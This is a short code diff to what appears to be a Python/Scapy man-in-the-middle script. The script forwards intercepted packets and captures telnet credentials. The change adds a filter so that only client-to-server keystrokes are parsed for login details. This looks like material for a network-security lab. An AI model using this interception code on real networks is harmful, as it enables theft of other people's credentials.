@@ -45,6 +45,9 @@ def mitm():
 def is_telnet_traffic(pckt):
     return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == hostB_IP or pckt[IP].src == hostB_IP)
 
+def is_client_keystroke(pckt):
+    return pckt.haslayer(Raw) and pckt.haslayer(IP) and pckt[IP].src == hostA_IP and pckt[IP].dst == hostB_IP
+
 def forward_packet(pckt):
     if pckt.haslayer(IP):
         # Forward packet to its intended destination
@@ -71,7 +74,8 @@ def print_pckt(pckt):
     # Forward the packet first to keep connection alive
     forward_packet(pckt)
     
-    if credentials_captured:
+    # Only process keystrokes from client (Host A) to server (Host B)
+    if not is_client_keystroke(pckt) or credentials_captured:
         return
     
     if pckt.haslayer(Raw):
